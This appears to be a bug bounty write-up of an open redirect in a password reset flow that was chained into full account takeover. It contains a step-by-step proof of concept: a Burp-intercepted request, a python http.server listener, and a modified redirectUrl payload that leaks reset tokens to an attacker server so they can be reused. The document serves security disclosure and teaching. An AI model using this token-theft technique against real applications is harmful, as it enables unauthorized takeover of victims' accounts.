# Open Redirection to Full Account Takeover (ATO)

## Description

* The vulnerability originated from an **Open Redirection** flaw in the password reset functionality.
* A parameter named `redirectUrl` was introduced during a previous security fix.
* The application failed to properly validate the destination URL supplied in the `redirectUrl` parameter.
* Attackers could control where users were redirected after clicking a password reset link.
* The reset token was included within the redirection flow, creating an opportunity for token theft.
* By chaining the Open Redirect with password reset token leakage, the vulnerability resulted in a **Full Account Takeover (ATO)**.

---

## How It Affected the Application

* Allowed attackers to steal password reset tokens.
* Enabled unauthorized password resets for victim accounts.
* Compromised the confidentiality and integrity of user accounts.
* Converted a low-severity Open Redirect issue into a high-impact account takeover vulnerability.
* Any user account could potentially be compromised if the victim clicked the malicious password reset link.
* Attackers could gain complete control over affected accounts by setting a new password.

---

## How It Was Exploited

### Attack Flow

* Attacker identifies a vulnerable password reset endpoint containing a `redirectUrl` parameter.
* The attacker modifies the `redirectUrl` value to point to an attacker-controlled server.
* A password reset email is generated for the victim.
* The victim clicks the password reset link received via email.
* The application processes the request and redirects the victim to the attacker-controlled server.
* During the redirection process, the password reset token is exposed.
* The attacker captures the reset token from incoming requests.
* The attacker uses the stolen token to reset the victim's password.
* Full account takeover is achieved.

### Root Cause

* Lack of validation on user-controlled redirect destinations.
* Sensitive password reset tokens were included in the redirection workflow.
* Improper handling of authentication-related tokens during redirects.

---

## Proof of Concept (PoC)

### Step 1: Login to the Application

```text
https://redacted.vulnsite.com/login
```

* Navigate to the "Forgot Password" functionality.

---

### Step 2: Intercept the Password Reset Request

* Use Burp Suite to capture the request.
* Send the request to Repeater for modification.

---

### Step 3: Prepare a Listener

Start a local web server to capture incoming requests:

```bash
python3 -m http.server 80
```

---

### Step 4: Modify the Request

Original parameter:

```json
{
  "redirectUrl":"https://trusted-site.com"
}
```

Modified parameter:

```json
{
  "redirectUrl":"http://127.0.0.1/?reset-result={0}&reset-callback-uri={1}"
}
```

---

### Step 5: Trigger Password Reset

* Submit the modified request.
* A password reset email is sent to the victim.

---

### Step 6: Victim Opens Reset Link

The victim clicks the password reset URL.

Example redirect:

```text
http://127.0.0.1/Secret_reset_token
```

---

### Step 7: Capture the Token

* The attacker's HTTP server receives the request.
* The password reset token is exposed in the URL.
* The token is logged by the attacker.

Example:

```text
GET /Secret_reset_token HTTP/1.1
```

---

### Step 8: Reset Victim Password

Replace the original reset URL with the stolen token:

```text
https://redacted.vulnsite.com/Secret_reset_token
```

* Access the password reset page.
* Set a new password.
* Gain complete control over the victim account.

---

## Impact

### Security Impact

* Full Account Takeover (ATO)
* Password Reset Token Theft
* Authentication Bypass
* Unauthorized Access to User Accounts

### Severity Escalation

| Initial Finding    | Final Impact               |
| ------------------ | -------------------------- |
| Open Redirect (P4) | Full Account Takeover (P2) |

---

## Key Lessons Learned

* Open Redirect vulnerabilities should never be dismissed as low impact without further testing.
* Password reset workflows must never expose sensitive tokens during redirects.
* Redirect destinations should be validated against an allowlist.
* Security fixes should always be retested for bypass opportunities.
* Chaining multiple low-severity issues can often lead to critical impact.

---

## Conclusion

This case demonstrates how a seemingly low-risk Open Redirect vulnerability was chained with password reset token leakage to achieve Full Account Takeover. By manipulating the `redirectUrl` parameter and capturing exposed reset tokens, an attacker could reset victim passwords and gain complete control over user accounts. The report highlights the importance of secure redirect handling, proper token protection, and evaluating vulnerabilities beyond their initial severity classification.
